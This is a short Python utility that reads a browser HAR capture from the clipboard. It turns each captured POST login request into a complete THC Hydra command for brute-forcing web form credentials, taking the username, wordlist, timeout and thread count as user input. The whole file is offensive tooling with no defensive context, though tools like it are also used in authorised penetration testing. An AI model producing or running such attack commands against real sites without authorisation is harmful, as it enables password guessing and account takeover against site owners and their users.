from win32clipboard import OpenClipboard, GetClipboardData, CloseClipboard, EmptyClipboard, SetClipboardText
from json import loads
def clipboard(msg=None):
    x = ""
    OpenClipboard()
    if msg:
        EmptyClipboard()
        SetClipboardText(msg)
    else:
        x = GetClipboardData()
    CloseClipboard()
    return x
for entry in loads(clipboard())["log"]["entries"]:
    if entry["request"]["method"] == "POST":
        clipboard("hydra " + entry["request"]["url"].split("/")[2] + (" https-form-post \"" if "s" in entry["request"]["url"].split("/")[0] else " http-form-post \"") + "/" + "".join(entry["request"]["url"].split("/")[3:]) + ":" + "&".join([list(x.keys())[0] + "=" + list(x.values())[0] for x in [{n["name"]:n["value"]} for n in entry["request"]["postData"]["params"]]]).replace("ABC", "^USER^").replace("XYZ", "^PASS^") + ":" + input("Invalid Flag: ") + ":" + "".join([":H=" + list(x.keys())[0] + ": " + list(x.values())[0] for x in [{n["name"]:n["value"]} for n in entry["request"]["headers"]]]) + "\" -l " + input("Username: ") + " -P " + input("Wordlist: ") + " -w " + input("Timeout: ") + " -t " + input("Threads: "))
print("Check your clipboard.")
